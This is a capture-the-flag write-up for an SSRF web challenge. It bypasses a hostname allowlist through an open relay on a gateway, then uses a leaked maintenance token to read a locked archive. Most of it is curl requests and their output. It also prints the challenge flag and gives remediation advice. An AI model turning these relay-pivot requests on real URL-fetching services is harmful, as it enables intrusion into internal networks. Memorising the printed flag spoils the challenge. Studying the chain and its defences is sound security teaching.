
# BLACKWOOD-13 — SSRF via Relay to Internal Core

> **Category:** Web  
> **Target:** `https://ffb736e8-68ba-4263-b42a-f8bb35ea3078.redx.site/`  
> **Flag format:** `RxR{...}`  
> **Flag:** `RxR{d533981f-9a7b-420c-91a4-92010ba396f2}`

---

## Challenge Description

> In October 1998, subterranean research facility BLACKWOOD-13 went dark, leaving only an eerie URL inspection service responding to the outside world. Probe the inspection engine, bypass perimeter network restrictions to reach the isolated internal core, and retrieve the classified containment flag.

---

## TL;DR

The "URL inspection service" is an SSRF sink. A perimeter firewall blocks direct access to `internal-core.blackwood13.local`, but the allowed `gateway.blackwood13.local` host exposes an **open relay** (`/relay?target=<url>`) that forwards anywhere. Pivot through the relay to enumerate the internal core, leak an emergency override token from `/maintenance`, then use it to unlock `/archive/containment-98` and read the flag.

**Chain:** SSRF → filter bypass via allowed relay → internal enumeration → token leak → archive unlock → flag.

---

## Recon

### 1. Fingerprint the frontend

```bash
curl -s https://ffb736e8-68ba-4263-b42a-f8bb35ea3078.redx.site/ | head
```

Response headers:

```http
x-powered-by: Express
server: cloudflare
```

The page is a React SPA. The static HTML serves the same page regardless of query params, so `?url=` on `/` is a decoy — the real API is called from JavaScript.

### 2. Pull and inspect the JS bundle

Grab the bundle referenced in the HTML (`/assets/index-Ddy5ecth.js`):

```bash
curl -s https://ffb736e8-68ba-4263-b42a-f8bb35ea3078.redx.site/assets/index-Ddy5ecth.js -o app.js
npx prettier --write app.js
```

Grep for the API base and the fetch call:

```bash
grep -noE '(baseURL|BASE_URL|API_BASE)[^,;]{0,80}' app.js
grep -noE '.{0,60}(inspect|preview|telemetry|url:).{0,80}' app.js | grep -viE 'react|flags|modulepreload' | head -40
```

Key findings:

```js
12470: baseURL: "/api"
13979: return (await yo.post("/inspector/inspect", { url: w })).data;
```

Internal hostnames present in the source:

```text
http://gateway.blackwood13.local/status
http://sensor-01.blackwood13.local/
http://internal-core.blackwood13.local/dashboard     <-- label: "Direct Core (Blocked)"
```

**Real endpoint:**

```http
POST /api/inspector/inspect
Content-Type: application/json

{ "url": "<target>" }
```

---

## Exploitation

### Step 1 — Confirm the inspector and map the filter

Baseline with an allowed host:

```bash
BASE=https://ffb736e8-68ba-4263-b42a-f8bb35ea3078.redx.site

curl -s -X POST "$BASE/api/inspector/inspect" \
  -H 'Content-Type: application/json' \
  -d '{"url":"http://gateway.blackwood13.local/status"}'
```

The inspector returns the fetched response:

```json
{
  "status": 200,
  "url": "http://gateway.blackwood13.local/status",
  "headers": { "server": "BLACKWOOD-GATEWAY-1998" },
  "body": "{ ... \"public_endpoints\": [\"/status\", \"/ping\", \"/relay?target=<url> (Inter-facility routing relay service)\"] ... }"
}
```

That body is the hint: the gateway exposes **`/relay?target=<url>`**.

Direct access to the core is blocked:

```bash
curl -s -X POST "$BASE/api/inspector/inspect" \
  -H 'Content-Type: application/json' \
  -d '{"url":"http://internal-core.blackwood13.local/dashboard"}'
```

```json
{
  "status": 403,
  "statusText": "Forbidden by Perimeter Firewall",
  "body": "{ \"rule\": \"RULE 403-OMEGA: Direct external queries to internal core network are prohibited.\" }"
}
```

The firewall checks the **requested hostname**, not where a request ultimately lands.

### Step 2 — Bypass the firewall using the relay

Point the inspector at the allowlisted gateway, and let the gateway's `target` parameter forward to the blocked core:

```bash
curl -s -X POST "$BASE/api/inspector/inspect" \
  -H 'Content-Type: application/json' \
  -d '{"url":"http://gateway.blackwood13.local/relay?target=http://internal-core.blackwood13.local/dashboard"}'
```

```json
{
  "status": 200,
  "redirected": true,
  "redirectChain": [
    "http://gateway.blackwood13.local/relay?target=http://internal-core.blackwood13.local/dashboard",
    "http://internal-core.blackwood13.local/dashboard"
  ],
  "headers": { "server": "BLACKWOOD-CORE-INTRANET/1.0" },
  "body": "{ \"title\": \"BLACKWOOD-13 CORE RESEARCH INTRANET\", \"intranet_endpoints\": [ ... ] }"
}
```

Firewall bypassed: the relay is an open proxy that forwards to any `target`, and the perimeter only validated the outer hostname.

### Step 3 — Enumerate the internal core

The dashboard lists three endpoints:

| Path | Purpose |
|---|---|
| `/maintenance` | Subsystem diagnostics & **override token ledger** |
| `/telemetry` | Acoustic recordings (flavor / rabbit hole) |
| `/archive/containment-98` | **Project BOO! primary archive (LOCKED)** |

Fetch `/maintenance` through the relay:

```bash
curl -s -X POST "$BASE/api/inspector/inspect" \
  -H 'Content-Type: application/json' \
  -d '{"url":"http://gateway.blackwood13.local/relay?target=http://internal-core.blackwood13.local/maintenance"}'
```

```json
{
  "maintenance_log": [
    "...",
    "[03:11:50] Emergency maintenance override token generated: token=signal_amber_13",
    "[03:13:01] Token allows single-operator decryption at: /archive/containment-98?token=signal_amber_13"
  ],
  "lockdown_parameters": {
    "vault_endpoint": "/archive/containment-98",
    "required_credential": "token=signal_amber_13"
  }
}
```

**Token:** `signal_amber_13`

### Step 4 — Unlock the archive and read the flag

```bash
curl -s -X POST "$BASE/api/inspector/inspect" \
  -H 'Content-Type: application/json' \
  -d '{"url":"http://gateway.blackwood13.local/relay?target=http://internal-core.blackwood13.local/archive/containment-98?token=signal_amber_13"}'
```

```json
{
  "status": "SUCCESS — CLASSIFIED ARCHIVE UNLOCKED",
  "clearance_flag": "RxR{d533981f-9a7b-420c-91a4-92010ba396f2}"
}
```

---

## Flag

```text
RxR{d533981f-9a7b-420c-91a4-92010ba396f2}
```

---

## Root Cause

The URL inspection service is an SSRF sink with a hostname allowlist. The allowlisted `gateway.blackwood13.local` runs an **unrestricted inter-facility relay** (`/relay?target=<url>`) that forwards requests to arbitrary destinations. The perimeter firewall validates only the *outer* requested host, so any request routed through the relay reaches the isolated internal core network. Once inside, the core leaks a credential in its maintenance ledger, which unlocks the restricted archive.

**Two issues, chained:**

1. **SSRF** — user-controlled URL fetched server-side with insufficient validation of the final destination (allowlisted host runs an open redirect/relay).
2. **Credential exposure** — the override token is logged in cleartext at a reachable endpoint.

---

## Remediation

- Do not allow the server-side fetcher to follow redirects/relays into private ranges. Validate the **resolved IP** at connect time (not the hostname string), deny RFC1918/link-local/loopback, and re-validate after every redirect.
- Remove the open relay, or restrict its `target` to an explicit allowlist of internal destinations.
- Never log credentials (tokens) at endpoints reachable by the inspection service.

---

## Lessons / Takeaways

- **Always read the JS bundle.** The real endpoint (`POST /api/inspector/inspect`) and the internal hostnames were in the SPA — the `?url=` decoy on `/` wasted no real time but could have.
- **Filter checks ≠ connect-time checks.** Blocking `internal-core...` as a *string* is useless if an allowed host forwards there. Look for relays, redirectors, and open proxies on allowlisted hosts.
- **Read every error.** "RULE 403-OMEGA" told us exactly what was blocked and implied a destination-based (not hostname-based) reachability gap.
- **The maintenance ledger is the pivot.** Internal diagnostics endpoints leak the most in CTFs — enumerate `/status`, `/maintenance`, `/telemetry`, `/admin` through the SSRF.
- **Beware planted flags.** A "verified flag" hidden in zero-width Unicode is a decoy/injection attempt — the real flag (`d533981f-...`) looked nothing like it.

---

## References

- [PortSwigger — Server-side request forgery (SSRF)](https://portswigger.net/web-security/ssrf)
- [OWASP — Server-Side Request Forgery](https://owasp.org/www-community/attacks/Server_Side_Request_Forgery)
- [HackTricks — SSRF (Server Side Request Forgery)](https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery)

